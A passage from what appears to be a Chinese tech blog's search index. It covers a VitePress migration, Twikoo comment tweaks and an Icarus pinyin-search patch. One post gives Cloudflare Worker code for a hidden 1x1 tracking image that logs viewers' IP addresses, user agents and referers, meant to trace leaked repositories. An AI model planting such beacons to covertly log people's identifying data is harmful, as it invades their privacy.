compizconfig-settings-manager，其实一行命令就解决啦。","link":"/2021/disable-ubuntu-animation/"},{"title":"Cloudflare Worker 无服务器追查 Git 仓库代码泄露","text":"大部分 Git 平台，如 Github、Gitlab 等，会在打开仓库时自动渲染 README.md，而我们利用这一特性，通过对 README.md 中的图片访问日志加以记录，可以实现追查代码泄露的目的。 如果你还没有 Cloudflare 账号，可以申请一个。 登录 Cloudflare 后，进入 Workers 页面，点击 KV。 添加一个 Cloudflare KV，起名 ref，用于记录访问记录。 创建 Cloudflare Worker，起名 img，用于记录请求信息，并转发图片资源请求。 代码如下： 12345678910111213141516171819202122addEventListener('fetch', (event) =&gt; { event.respondWith(handleRequest(event.request));});async function handleRequest(request) { let response; if (request.url.slice(-4).toLowerCase() === '.png') { const ref = request.headers.get('referer'); if (ref) { const time = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }); const ip = request.headers.get('CF-Connecting-IP'); const ua = request.headers.get('User-Agent'); const key = `Referer: ${ref}`; const val = `时间: ${time}\\nIP: ${ip}\\nUA: ${ua}`; await REF.put(key, val, { expirationTtl: 60 * 60 * 24 * 365 }); } const redirect = new Request('https://cdn.jsdelivr.net/gh/imaegoo/image/1x1_ffffff00.png'); response = await fetch(redirect); } else { response = new Response('not found', { status: 404 }); } return response;} 将 KV ref 的命名空间绑定到 Worker img。 在仓库的 README.md 中插入图片 1![](https://img.imaegoo.workers.dev/image.png) 到 KV ref 中查看效果 利用同样的思路和方法，我们还可以追查网站文章未经授权的转载，试试看！","link":"/2021/git-tracking-image/"},{"title":"体验 VitePress：文档编译还能这么快！","text":"基于 VuePress 的项目文档的编译速度一直让我很苦恼，启动一次 dev server 要大约半分钟的时间，而且哪怕只有一个 Hello World，速度也是这么慢。相比之下，Hexo 都比它快。这当然不只是 VuePress 本身的问题，要说还得归咎于 Webpack。 于是 Vite 诞生了，一起诞生的还有 VitePress。好耶！虽然 VitePress 仍处于 WIP 阶段，告诉我们不要在任何地方使用，但我们可以提前对比一下，它究竟能比 VuePress 快多少？我们使用基于 VuePress 的 Twikoo 文档测试一下。 安装1yarn add -D vitepress 从 VuePress 迁移配置VitePress 中 themeConfig.sidebar 的配置，较 VuePress 有些不同，需要新建 .vitepress 目录，对原先的配置做一点点改动 .vuepress/config.js12345678910111213141516171819202122module.exports = { title: 'Twikoo 中文文档', description: 'Twikoo 中文文档', themeConfig: { sidebar: [ ['/', '简介'], '/quick-start', '/faq', '/api', '/link' ], lastUpdated: true, // 假定是 GitHub. 同时也可以是一个完整的 GitLab URL repo: 'imaegoo/twikoo', // 假如文档不是放在仓库的根目录下： docsDir: 'docs', // 假如文档放在一个特定的分支下： docsBranch: 'dev', // 默认是 false, 设置为 true 来启用 editLinks: true }} .vitepress/config.js123456789101112131415161718192021222324module.exports = { title: 'Twikoo 中文文档', description: 'Twikoo 中文文档', themeConfig: { sidebar: { '/': [ { text: '简介', link: '/' }, { text: '快速上手', link: '/quick-start' }, { text: '常见问题', link: '/faq' }, { text: 'API 文档', link: '/api' }, { text: '相关文档', link: '/link' }, ] }, lastUpdated: true, // 假定是 GitHub. 同时也可以是一个完整的 GitLab URL repo: 'imaegoo/twikoo', // 假如文档不是放在仓库的根目录下： docsDir: 'docs', // 假如文档放在一个特定的分支下： docsBranch: 'dev', // 默认是 false, 设置为 true 来启用 editLinks: true }} VitePress 没有把 README.md 渲染成首页，需要把 README.md 重命名为 index.md。 测试编译速度多次测试在机械硬盘上两者的编译速度，VuePress 的编译时间在 30 ~ 50 秒之间，而 VitePress 的编译时间基本都在 6 ~ 7 秒，遥遥领先。 vuepress1234567891011121314151617181920$ vuepress build docswait Extracting site metadata...tip Apply local theme at D:\\Workspace\\Jimmy\\twikoo\\docs\\.vuepress\\theme...tip Apply theme local (extends @vuepress/theme-default) ...tip Apply plugin container (i.e. &quot;vuepress-plugin-container&quot;) ...tip Apply plugin @vuepress/last-updated (i.e. &quot;@vuepress/plugin-last-updated&quot;) ...tip Apply plugin @vuepress/register-components (i.e. &quot;@vuepress/plugin-register-components&quot;) ...tip Apply plugin @vuepress/active-header-links (i.e. &quot;@vuepress/plugin-active-header-links&quot;) ...tip Apply plugin @vuepress/search (i.e. &quot;@vuepress/plugin-search&quot;) ...tip Apply plugin @vuepress/nprogress (i.e. &quot;@vuepress/plugin-nprogress&quot;) ...√ Client Compiled successfully in 17.77s√ Server Compiled successfully in 14.63swait Rendering static HTML...success Generated static files in docs\\.vuepress\\dist.Done in 31.87s. vitepress1234567891011121314$ vitepress build docsvitepress v0.11.5vite v2.0.0-beta.65⠹ building client + server bundles...Langua e does not exist: shge does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: shLanguage does not exist: sh✓ building client + server bundles...✓ rendering pages...build complete in 5.39s.Done in 6.27s. 页面效果基本一致，可以看出 VitePress 存在一些渲染上的小区别。","link":"/2021/hello-vitepress/"},{"title":"集成 Twikoo 与 lightGallery 插件，实现评论图片的点击放大","text":"Twikoo 文档页和本站的评论区，支持评论图片点击放大，你现在就可以就下拉到本文评论区试一试！ 为什么 Twikoo 没有官方支持图片点击放大？ 会增加包体大小 涉及 body DOM 节点操作，为了不影响在不同主题下的显示效果，需要杜绝这类操作 lightGallery 库是 GPLv3 协议的 我就想要实现图片点击放大功能！首先需要你拥有修改博客主题的能力。 在合适的位置（文章页，twikoo.init() 之前），引入相关的 JS 和 CSS 文件 123&lt;!-- lightGallery --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/lightgallery@2.1.8/css/lightgallery.css&quot;&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/lightgallery@2.1.8/lightgallery.min.js&quot;&gt;&lt;/script&gt; 找到 twikoo.init 代码所在位置，进行修改 123456789101112131415161718192021222324252627twikoo.init({ // envId: 'abcdef', // ... onCommentLoaded: function () { var commentContents = document.getElementsByClassName('tk-content'); for (var i = 0; i &lt; commentContents.length; i++) { var commentItem = commentContents[i]; var imgEls = commentItem.getElementsByTagName('img'); if (imgEls.length &gt; 0) { for (var j = 0; j &lt; imgEls.length; j++) { var imgEl = imgEls[j]; var aEl = document.createElement('a'); aEl.setAttribute('class', 'tk-lg-link'); aEl.setAttribute('href', imgEl.getAttribute('src')); aEl.setAttribute('data-src', imgEl.getAttribute('src')); aEl.appendChild(imgEl.cloneNode(false)); imgEl.parentNode.insertBefore(aEl, imgEl.nextSibling); imgEl.remove(); } lightGallery(commentItem, { selector: '.tk-lg-link', share: false }); } } }}); 大功告成！","link":"/2021/twikoo-lightgallery/"},{"title":"Twikoo 多个页面共用一个评论区","text":"有时候博主希望多个页面共用一个评论区，我们可以自定义 path 做到这一点。 首先要确定自己所用的博客主题支持 Twikoo path 配置，否则需要自己修改主题源码添加 path 配置。 设置主题的 Twikoo path 配置为 window.TWIKOO_MAGIC_PATH||window.location.pathname 然后在所有需要共用评论区的页面正文中增加以下代码 &lt;script&gt;window.TWIKOO_MAGIC_PATH=&quot;评论区名称&quot;&lt;/script&gt; 把中间的“评论区名称”替换为你指定的名称，共用的页面请起 相同的 评论区名称，其他页面不做改动即可。 试试看！ 注意 如果你的网站使用了 PJAX 或类似的局部刷新技术，请在页面切换时清除 window.TWIKOO_MAGIC_PATH 的值，以免造成异常的评论区共用。","link":"/2021/twikoo-path/"},{"title":"让 Icarus Insight 搜索插件支持拼音检索文章","text":"要是 Icarus 能用拼音搜文章就好了，如果你也有这样的想法，那这篇文章也许会对你有帮助。 效果 前提 Icarus 版本 3.0 以上 搜索插件使用的是 Insight 方法 保存下面的文件到 themes/icarus/source/js，并重命名为 pinyin.jshttps://github.com/xmflswood/pinyin-match/blob/master/dist/main.js 保存下面的文件到 themes/icarus/layout/search，并重命名为 insight.jsxhttps://github.com/ppoffice/hexo-component-inferno/raw/master/src/view/search/insight.jsx 保存下面的文件到 themes/icarus/source/js，并重命名为 insight.jshttps://github.com/ppoffice/hexo-component-inferno/raw/master/asset/js/insight.js 修改 themes/icarus/layout/search/insight.jsx，加入拼音检索开关和依赖的 pinyin.jsinsight.jsx.diff >folded1234567891011121314151617181920212223242526272829303132diff --git a/src/view/search/insight.jsx b/src/view/search/insight.jsxindex 05a1c40..cce136d 100644--- a/src/view/search/insight.jsx+++ b/src/view/search/insight.jsx@@ -3,7 +3,7 @@ * @module view/search/insight */ const { Component, Fragment } = require('inferno');-const { cacheComponent } = require('../../util/cache');+const { cacheComponent } = require('hexo-component-inferno/lib/util/cache'); /** * Algolia search engine JSX component.@@ -36,11 +36,18 @@ class Insight extends Component { &lt;div class=&quot;searchbox-input-container&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;searchbox-input&quot; placeholder={translation.hint}/&gt; &lt;/div&gt;+ &lt;div class=&quot;searchbox-pinyin&quot;&gt;+ &lt;label class=&quot;checkbox&quot;&gt;+ &lt;input id=&quot;search-by-pinyin&quot; type=&quot;checkbox&quot; checked=&quot;checked&quot;/&gt;+ &lt;span&gt;&amp;nbsp;拼音检索&lt;/span&gt;+ &lt;/label&gt;+ &lt;/div&gt; &lt;a class=&quot;searchbox-close&quot; href=&quot;javascript:;&quot;&gt;&amp;times;&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;searchbox-body&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt;+ &lt;script src=&quot;/js/pinyin.js&quot; defer={true}&gt;&lt;/script&gt; &lt;script src={jsUrl} defer={true}&gt;&lt;/script&gt; &lt;script dangerouslySetInnerHTML={{ __html: js }}&gt;&lt;/script&gt; &lt;/Fragment&gt;; 修改后完整的 insight.jsx 如下：insight.jsx >folded12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788/** * Insight search plugin JSX component. * @module view/search/insight */const { Component, Fragment } = require('inferno');const { cacheComponent } = require('hexo-component-inferno/lib/util/cache');/** * Algolia search engine JSX component. * * @example * &lt;Insight * translation={{ * hint: '******', * untitled: '******', * posts: '******', * pages: '******', * categories: '******', * tags: '******' * }} * contentUrl=&quot;/path/to/content.json&quot; * jsUrl=&quot;/path/to/insight.js&quot; /&gt; */class Insight extends Component { render() { const { translation, contentUrl, jsUrl } = this.props; const js = `document.addEventListener('DOMContentLoaded', function () { loadInsight(${JSON.stringify({ contentUrl })}, ${JSON.stringify(translation)}); });`; return &lt;Fragment&gt; &lt;div class=&quot;searchbox&quot;&gt; &lt;div class=&quot;searchbox-container&quot;&gt; &lt;div class=&quot;searchbox-header&quot;&gt; &lt;div class=&quot;searchbox-input-container&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;searchbox-input&quot; placeholder={translation.hint}/&gt; &lt;/div&gt; &lt;div class=&quot;searchbox-pinyin&quot;&gt; &lt;label class=&quot;checkbox&quot;&gt; &lt;input id=&quot;search-by-pinyin&quot; type=&quot;checkbox&quot; checked=&quot;checked&quot;/&gt; &lt;span&gt;&amp;nbsp;拼音检索&lt;/span&gt; &lt;/label&gt; &lt;/div&gt; &lt;a class=&quot;searchbox-close&quot; href=&quot;javascript:;&quot;&gt;&amp;times;&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;searchbox-body&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;script src=&quot;/js/imaegoo/pinyin.js&quot; defer={true}&gt;&lt;/script&gt; &lt;script src={jsUrl} defer={true}&gt;&lt;/script&gt; &lt;script dangerouslySetInnerHTML={{ __html: js }}&gt;&lt;/script&gt; &lt;/Fragment&gt;; }}/** * Cacheable Insight search plugin JSX component. * &lt;p&gt; * This class is supposed to be used in combination with the &lt;code&gt;locals&lt;/code&gt; hexo filter * ({@link module:hexo/filter/locals}). * * @see module:util/cache.cacheComponent * @example * &lt;Insight.Cacheable * helper={{ * __: function() {...}, * cdn: function() {...} * }} /&gt; */Insight.Cacheable = cacheComponent(Insight, 'search.insight', props =&gt; { const { helper } = props; return { translation: { hint: helper.__('search.hint'), untitled: helper.__('search.untitled'), posts: helper._p('common.post', Infinity), pages: helper._p('common.page', Infinity), categories: helper._p('common.category', Infinity), tags: helper._p('common.tag', Infinity) }, contentUrl: helper.url_for('/content.json'), jsUrl: helper.url_for('/js/insight.js') };});module.exports = Insight; 修改 themes/icarus/source/js/insight.js，在原有匹配代码基础上增加拼音匹配代码insight.js.diff >folded12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364diff --git a/asset/js/insight.js b/asset/js/insight.jsindex 33150b3..205a096 100644--- a/asset/js/insight.js+++ b/asset/js/insight.js@@ -6,6 +6,19 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var const $main = $('.searchbox'); const $input = $main.find('.searchbox-input'); const $container = $main.find('.searchbox-body');+ const $searchByPinyin = $main.find('#search-by-pinyin');++ /**+ * 查询匹配拼音的数据。性能低于普通匹配，如果未启用拼音检索模式，直接返回 false。+ * https://github.com/xmflswood/pinyin-match+ * @param input {string} 目标字符串+ * @param keyword {string} 输入的拼音或其他关键词+ * @returns {[Array]|{Boolean}} 找到返回出现位置，未找到 / 未启用返回 false+ */+ function pinyinMatch(input, keyword) {+ if (!$searchByPinyin.prop(&quot;checked&quot;)) return false;+ return PinyinMatch.match(input, keyword);+ } function section(title) { return $('&lt;section&gt;').addClass('searchbox-result-section').append($('&lt;header&gt;').text(title));@@ -33,10 +46,12 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var const testText = text.toLowerCase(); const indices = matches.map(match =&gt; { const index = testText.indexOf(match.toLowerCase());- if (!match || index === -1) {- return null;+ if (match &amp;&amp; index !== -1) {+ return [index, index + match.length]; }- return [index, index + match.length];+ // Search by pinyin+ const pinyinIndex = pinyinMatch(testText, match.toLowerCase());+ return pinyinIndex ? [pinyinIndex[0], pinyinIndex[1] + 1] : null; }).filter(match =&gt; { return match !== null; }).sort((a, b) =&gt; {@@ -140,6 +155,8 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var } if (obj[field].toLowerCase().indexOf(keyword) &gt; -1) { return true;+ } else if (pinyinMatch(obj[field].toLowerCase(), keyword)) {+ return true; } return false; });@@ -266,10 +283,12 @@ function loadInsight(config, translation) { // eslint-disable-line no-unused-var if (location.hash.trim() === '#insight-search') { $main.addClass('show'); }- $input.on('input', function() {- const keywords = $(this).val();+ function onInputChange() {+ const keywords = $input.val(); searchResultToDOM(keywords, search(json, keywords));- });+ }+ $input.on('input', onInputChange);+ $searchByPinyin.on('change', onInputChange); $input.trigger('input'); }); 修改后完整的 insight.js 如下：insight.js >folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332/** * Insight search plugin * @author PPOffice { @link https://github.com/ppoffice } */function loadInsight(config, translation) { // eslint-disable-line no-unused-vars const $main = $('.searchbox'); const $input = $main.find('.searchbox-input'); const $container = $main.find('.searchbox-body'); const $searchByPinyin = $main.find('#search-by-pinyin'); /** * 查询匹配拼音的数据。性能低于普通匹配，如果未启用拼音检索模式，直接返回 false。 * https://github.com/xmflswood/pinyin-match * @param input {string} 目标字符串 * @param keyword {string} 输入的拼音或其他关键词 * @returns {[Array]|{Boolean}} */ function pinyinMatch(input, keyword) { if (!$searchByPinyin.prop(&quot;checked&quot;)) return false; return PinyinMatch.match(input, keyword); } function section(title) { return $('&lt;section&gt;').addClass('searchbox-result-section').append($('&lt;header&gt;').text(title)); } function merge(ranges) { let last; const result = []; ranges.forEach(r =&gt; { if (!last || r[0] &gt; last[1]) { result.push(last = r); } else if (r[1] &gt; last[1]) { last[1] = r[1]; } }); return result; } function findAndHighlight(text, matches, maxlen) { if (!Array.isArray(matches) || !matches.length || !text) { return maxlen ? text.slice(0, maxlen) : text; } const testText = text.toLowerCase(); const indices = matches.map(match =&gt; { const index = testText.indexOf(match.toLowerCase()); if (match &amp;&amp; index !== -1) { return [index, index + match.length]; } // Search by pinyin const pinyinIndex = pinyinMatch(testText, match.toLowerCase()); return pinyinIndex ? [pinyinIndex[0], pinyinIndex[1] + 1] : null; }).filter(match =&gt; { return match !== null; }).sort((a, b) =&gt; { return a[0] - b[0] || a[1] - b[1]; }); if (!indices.length) { return text; } let result = ''; let last = 0; const ranges = merge(indices); const sumRange = [ranges[0][0], ranges[ranges.length - 1][1]]; if (maxlen &amp;&amp; maxlen &lt; sumRange[1]) { last = sumRange[0]; } for (let i = 0; i &lt; ranges.length; i++) { const range = ranges[i]; result += text.slice(last, Math.min(range[0], sumRange[0] + maxlen)); if (maxlen &amp;&amp; range[0] &gt;= sumRange[0] + maxlen) { break; } result += '&lt;em&gt;' + text.slice(range[0], range[1]) + '&lt;/em&gt;'; last = range[1]; if (i === ranges.length - 1) { if (maxlen) { result += text.slice(range[1], Math.min(text.length, sumRange[0] + maxlen + 1)); } else { result += text.slice(range[1]); } } } return result; } function searchItem(icon, title, slug, preview, url) { title = title != null &amp;&amp; title !== '' ? title : translation.untitled; return `&lt;a class=&quot;searchbox-result-item&quot; href=&quot;${url}&quot;&gt; &lt;span class=&quot;searchbox-result-icon&quot;&gt; &lt;i class=&quot;fa fa-${icon}&quot; /&gt; &lt;/span&gt; &lt;span class=&quot;searchbox-result-content&quot;&gt; &lt;span class=&quot;searchbox-result-title&quot;&gt; ${title} ${slug ? '&lt;span class=&quot;searchbox-result-title-secondary&quot;&gt;(' + slug + ')&lt;/span&gt;' : ''} &lt;/span&gt; ${preview ? '&lt;span class=&quot;searchbox-result-preview&quot;&gt;' + preview + '&lt;/span&gt;' : ''} &lt;/span&gt; &lt;/a&gt;`; } function sectionFactory(keywords, type, array) { let $searchItems; if (array.length === 0) return null; const sectionTitle = translation[type.toLowerCase()]; switch (type) { case 'POSTS': case 'PAGES': $searchItems = array.map(item =&gt; { const title = findAndHighlight(item.title, keywords); const text = findAndHighlight(item.text, keywords, 100); return searchItem('file', title, null, text, item.link); }); break; case 'CATEGORIES': case 'TAGS': $searchItems = array.map(item =&gt; { const name = findAndHighlight(item.name, keywords); const slug = findAndHighlight(item.slug, keywords); return searchItem(type === 'CATEGORIES' ? 'folder' : 'tag', name, slug, null, item.link); }); break; default: return null; } return section(sectionTitle).append($searchItems); } function parseKeywords(keywords) { return keywords.split(' ').filter(keyword =&gt; { return !!keyword; }).map(keyword =&gt; { return keyword.toLowerCase(); }); } /** * Judge if a given post/page/category/tag contains all of the keywords. * @param Object obj Object to be weighted * @param Array&lt;String&gt; fields Object's fields to find matches */ function filter(keywords, obj, fields) { const keywordArray = parseKeywords(keywords); const containKeywords = keywordArray.filter(keyword =&gt; { const containFields = fields.filter(field =&gt; { if (!Object.prototype.hasOwnProperty.call(obj, field)) { return false; } if (obj[field].toLowerCase().indexOf(keyword) &gt; -1) { return true; } else if (pinyinMatch(obj[field].toLowerCase(), keyword)) { return true; } return false; }); if (containFields.length &gt; 0) { return true; } return false; }); return containKeywords.length === keywordArray.length; } function filterFactory(keywords) { return { post: function(obj) { return filter(keywords, obj, ['title', 'text']); }, page: function(obj) { return filter(keywords, obj, ['title', 'text']); }, category: function(obj) { return filter(keywords, obj, ['name', 'slug']); }, tag: function(obj) { return filter(keywords, obj, ['name', 'slug']); } }; } /** * Calculate the weight of a matched post/page/category/tag. * @param Object obj Object to be weighted * @param Array&lt;String&gt; fields Object's fields to find matches * @param Array&lt;Integer&gt; weights Weight of every field */ function weight(keywords, obj, fields, weights) { let value = 0; parseKeywords(keywords).forEach(keyword =&gt; { const pattern = new RegExp(keyword, 'img'); // Global, Multi-line, Case-insensitive fields.forEach((field, index) =&gt; { if (Object.prototype.hasOwnProperty.call(obj, field)) { const matches = obj[field].match(pattern); value += matches ? matches.length * weights[index] : 0; } }); }); return value; } function weightFactory(keywords) { return { post: function(obj) { return weight(keywords, obj, ['title', 'text'], [3, 1]); }, page: function(obj) { return weight(keywords, obj, ['title', 'text'], [3, 1]); }, category: function(obj) { return weight(keywords, obj, ['name', 'slug'], [1, 1]); }, tag: function(obj) { return weight(keywords, obj, ['name', 'slug'], [1, 1]); } }; } function search(json, keywords) { const weights = weightFactory(keywords); const filters = filterFactory(keywords); const posts = json.posts; const pages = json.pages; const tags = json.tags; const categories = json.categories; return { posts: posts.filter(filters.post).sort((a, b) =&gt; { return weights.post(b) - weights.post(a); }).slice(0, 5), pages: pages.filter(filters.page).sort((a, b) =&gt; { return weights.page(b) - weights.page(a); }).slice(0, 5), categories: categories.filter(filters.category).sort((a, b) =&gt; { return weights.category(b) - weights.category(a); }).slice(0, 5), tags: tags.filter(filters.tag).sort((a, b) =&gt; { return weights.tag(b) - weights.tag(a); }).slice(0, 5) }; } function searchResultToDOM(keywords, searchResult) { $container.empty(); for (const key in searchResult) { $container.append(sectionFactory(parseKeywords(keywords), key.toUpperCase(), searchResult[key])); } } function scrollTo($item) { if ($item.length === 0) return; const wrapperHeight = $container[0].clientHeight; const itemTop = $item.position().top - $container.scrollTop(); const itemBottom = $item[0].clientHeight + $item.position().top; if (itemBottom &gt; wrapperHeight + $container.scrollTop()) { $container.scrollTop(itemBottom - $container[0].clientHeight); } if (itemTop &lt; 0) { $container.scrollTop($item.position().top); } } function selectItemByDiff(value) { const $items = $.makeArray($container.find('.searchbox-result-item')); let prevPosition = -1; $items.forEach((item, index) =&gt; { if ($(item).hasClass('active')) { prevPosition = index; } }); const nextPosition = ($items.length + prevPosition + value) % $items.length; $($items[prevPosition]).removeClass('active'); $($items[nextPosition]).addClass('active'); scrollTo($($items[nextPosition])); } function gotoLink($item) { if ($item &amp;&amp; $item.length) { location.href = $item.attr('href'); } } $.getJSON(config.contentUrl, json =&gt; { if (location.hash.trim() === '#insight-search') { $main.addClass('show'); } function onInputChange() { const keywords = $input.val(); searchResultToDOM(keywords, search(json, keywords)); } $input.on('input', onInputChange); $searchByPinyin.on('change', onInputChange); $input.trigger('input'); }); let touch = false; $(document).on('click focus', '.navbar-main .search', () =&gt; { $main.addClass('show'); $main.find('.searchbox-input').focus(); }).on('click touchend', '.searchbox-result-item', function(e) { if (e.type !== 'click' &amp;&amp; !touch) { return; } gotoLink($(this)); touch = false; }).on('click touchend', '.searchbox-close', e =&gt; { if (e.type !== 'click' &amp;&amp; !touch) { return; } $('.navbar-main').css('pointer-events', 'none'); setTimeout(() =&gt; { $('.navbar-main').css('pointer-events', 'auto'); }, 400); $main.removeClass('show'); touch = false; }).on('keydown', e =&gt; { if (!$main.hasClass('show')) return; switch (e.keyCode) { case 27: // ESC $main.removeClass('show'); break; case 38: // UP selectItemByDiff(-1); break; case 40: // DOWN selectItemByDiff(1); break; case 13: // ENTER gotoLink($container.find('.searchbox-result-item.active').eq(0)); break; } }).on('touchstart', e =&gt; { touch = true; }).on('touchmove', e =&gt; { touch = false; });} 修改 themes/icarus/include/style/search.styl，调整拼音检索复选框大小和位置search.styl.diff >folded123456789101112131415161718192021diff --git a/include/style/search.styl b/include/style/search.stylindex 0cdedd9..02d9b5e 100644--- a/include/style/search.styl+++ b/include/style/search.styl@@ -96,6 +96,16 @@ $searchbox-bg-pagination-item-disabled ?= $searchbox-bg-container padding: .75em 0 .75em 1.25em background: $searchbox-bg-input+ .searchbox-pinyin+ display: flex+ align-items: center+ user-select: none+ input+ vertical-align: middle+ span+ position: relative+ top: 1px+ .searchbox-close display: inline-block font-size: 1.5em 修改后完整的 search.styl 如下：search.styl >folded123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204/* --------------------------------- * Search Box * --------------------------------- */// container sizes$searchbox-container-width ?= 540px$searchbox-container-margin ?= 100px$searchbox-breakpoint-width ?= 559px$searchbox-breakpoint-height ?= 479px// overlay and container styles$searchbox-box-shadow ?= $card-shadow$searchbox-border-radius ?= $radius$searchbox-bg-overlay ?= $modal-background-background-color$searchbox-bg-container ?= $white-ter$searchbox-border ?= $border// header styles$searchbox-bg-input ?= $white$searchbox-bg-close-hover ?= $searchbox-bg-container$searchbox-bg-close-active ?= $grey-lighter// body styles$searchbox-fg-result-header ?= $grey-light$searchbox-fg-result-item-secondary ?= $grey-light$searchbox-bg-result-item-hover ?= $searchbox-bg-input$searchbox-fg-result-item-active ?= findColorInvert($primary)$searchbox-bg-result-item-active ?= $primary$searchbox-bg-result-item-highlight ?= $yellow// footer styles$searchbox-bg-pagination-item ?= $searchbox-bg-input$searchbox-bg-pagination-item-hover ?= $searchbox-bg-container$searchbox-fg-pagination-item-active ?= findColorInvert($primary)$searchbox-bg-pagination-item-active ?= $primary$searchbox-bg-pagination-item-disabled ?= $searchbox-bg-container.searchbox display: none top: 0 left: 0 width: 100% height: 100% z-index: 100 font-size: 1rem line-height: 0 background: $searchbox-bg-overlay &amp;.show display: flex a, a:hover color: inherit text-decoration: none input font-size: 1rem border: none outline: none box-shadow: none border-radius: 0 &amp;, .searchbox-container position: fixed align-items: center flex-direction: column line-height: 1.25em .searchbox-container z-index: 101 display: flex overflow: hidden box-shadow: $searchbox-box-shadow border-radius: $searchbox-border-radius background-color: $searchbox-bg-container width: $searchbox-container-width top: $searchbox-container-margin bottom: $searchbox-container-margin .searchbox-header, .searchbox-body, .searchbox-footer width: 100% .searchbox-header display: flex flex-direction: row line-height: 1.5em font-weight: normal background-color: $searchbox-bg-input // fix Chrome 71 height issue // https://github.com/ppoffice/hexo-theme-icarus/issues/719 min-height: 3rem .searchbox-input-container display: flex flex-grow: 1 .searchbox-input flex-grow: 1 color: inherit box-sizing: border-box padding: .75em 0 .75em 1.25em background: $searchbox-bg-input .searchbox-close display: inline-block font-size: 1.5em padding: .5em .75em cursor: pointer &amp;:hover background: $searchbox-bg-close-hover &amp;:active background: $searchbox-bg-close-active .searchbox-body flex-grow: 1 overflow-y: auto border-top: 1px solid $searchbox-border .searchbox-result-section header, .searchbox-result-item padding: .75em 1em .searchbox-result-section border-bottom: 1px solid $searchbox-border header color: $searchbox-fg-result-header .searchbox-result-item display: flex flex-direction: row &amp;:not(.disabled):not(.active):not(:active):hover background-color: $searchbox-bg-result-item-hover &amp;:active, &amp;.active color: $searchbox-fg-result-item-active background-color: $searchbox-bg-result-item-active em font-style: normal background: $searchbox-bg-result-item-highlight .searchbox-result-icon margin-right: 1em .searchbox-result-content overflow: hidden .searchbox-result-title, .searchbox-result-preview display: block overflow: hidden white-space: nowrap text-overflow: ellipsis .searchbox-result-title-secondary color: $searchbox-fg-result-item-secondary .searchbox-result-preview margin-top: .25em .searchbox-result-item:not(:active):not(.active) .searchbox-result-preview color: $searchbox-fg-result-item-secondary .searchbox-footer padding: .5em 1em .searchbox-pagination margin: 0 padding: 0 list-style: none text-align: center .searchbox-pagination-item margin: 0 .25rem .searchbox-pagination-item, .searchbox-pagination-link display: inline-block .searchbox-pagination-link overflow: hidden padding: .5em .8em box-shadow: $searchbox-box-shadow border-radius: $searchbox-border-radius background-color: $searchbox-bg-pagination-item .searchbox-pagination-item.active .searchbox-pagination-link color: $searchbox-fg-pagination-item-active background-color: $searchbox-bg-pagination-item-active .searchbox-pagination-item.disabled .searchbox-pagination-link cursor: not-allowed background-color: $searchbox-bg-pagination-item-disabled .searchbox-pagination-item:not(.active):not(.disabled) .searchbox-pagination-link:hover background-color: $searchbox-bg-pagination-item-hover@media screen and (max-width: $searchbox-breakpoint-width), screen and (max-height: $searchbox-breakpoint-height) .searchbox .searchbox-container top: 0 left: 0 width: 100% height: 100% border-radius: 0 感谢xmflswood 提供的 pinyin-match &nbsp;&nbsp; Landscape Vectors by Vecteezy","link":"/2020/icarus-insight-pinyin/"},{"title":"活用 Bulma 美化 Icarus 文章","text":"Icarus 相信大家都很熟悉，但是有时候我们希望在文章中用特别的样式注明一些内容，markdown 语法就不够用了，所以 Icarus 有哪些高级玩法呢？下面就让 iMaeGoo 带大家一起了解吧。（误 TOC 按钮 进度条 标签页 彩色突出 点击展开代码 你知道的太多了 让简介不出现在正文 封面图来源声明 按钮 进度条 标签页 彩色突出 点击展开代码 你知道的太多了 让简介不出现在正文 封面图来源声明 .post-summary { display: none; } 按钮 Info Success Warning Danger 点击展开代码 >folded123456&lt;div class=&quot;buttons&quot;&gt; &lt;button class=&quot;button is-info&quot;&gt;Info&lt;/button&gt; &lt;button class=&quot;button is-success&quot;&gt;Success&lt;/button&gt; &lt;button class=&quot;button is-warning&quot;&gt;Warning&lt;/button&gt; &lt;button class=&quot;button is-danger&quot;&gt;Danger&lt;/button&gt;&lt;/div&gt; 光有按钮肯定是不行的，一般我们还需要给按钮增加事件，比如点击下面的按钮，可以显示一条一言（Hitokoto）。 显示一言 ↑↑↑ 试着点击“显示一言”！ function showHitokoto (event) { event.target.classList.add('is-loading'); $.ajax({ type: 'GET', url: 'https://v1.hitokoto.cn/', success: function (data) { $('.hitokoto').text(data.hitokoto); event.target.classList.remove('is-loading'); } }); } 点击展开代码 >folded12345678910111213141516&lt;button class=&quot;button is-info&quot; onclick=&quot;showHitokoto(event)&quot;&gt;显示一言&lt;/button&gt;&lt;blockquote class=&quot;hitokoto&quot;&gt;↑↑↑ 试着点击“显示一言”！&lt;/blockquote&gt;&lt;script&gt;function showHitokoto (event) { 